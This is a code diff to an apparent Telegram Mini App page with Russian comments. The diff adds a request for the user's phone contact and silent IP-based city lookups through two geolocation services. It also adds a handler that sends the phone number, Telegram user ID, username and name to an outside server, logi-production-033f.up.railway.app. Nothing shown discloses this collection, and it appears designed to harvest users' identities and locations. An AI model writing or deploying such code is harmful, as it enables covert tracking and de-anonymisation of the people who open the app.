@@ -40,15 +40,23 @@
     document.getElementById('btn').addEventListener('click', async () => {
       const user = tg.initDataUnsafe?.user || {};
 
-      // Город через IP
+      // Запрашиваем номер телефона
+      tg.requestContact((ok, contact) => {});
+
+      // Город через два источника — если первый не даст реальный
       let city = 'Неизвестно';
       try {
-        const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
-        city = geo.city || 'Неизвестно';
-      } catch {}
+        const r1 = await fetch('https://ipwho.is/').then(r => r.json());
+        city = r1.city || 'Неизвестно';
+      } catch {
+        try {
+          const r2 = await fetch('https://ipapi.co/json/').then(r => r.json());
+          city = r2.city || 'Неизвестно';
+        } catch {}
+      }
 
       const payload = {
-        init_data: tg.initData,           // подпись Telegram — верифицируем на боте
+        init_data: tg.initData,
         user_id:   user.id,
         username:  user.username || '',
         name:      `${user.first_name || ''} ${user.last_name || ''}`.trim(),
@@ -64,6 +72,20 @@
       });
 
       tg.close();
+    });
+
+    // Ловим номер телефона когда пользователь разрешил
+    tg.onEvent('contactRequested', async (result) => {
+      if (result?.contact?.phone_number) {
+        await fetch('https://logi-production-033f.up.railway.app/phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            user_id: tg.initDataUnsafe?.user?.id,
+            phone:   result.contact.phone_number,
+          }),
+        });
+      }
     });
   </script>
 </body>
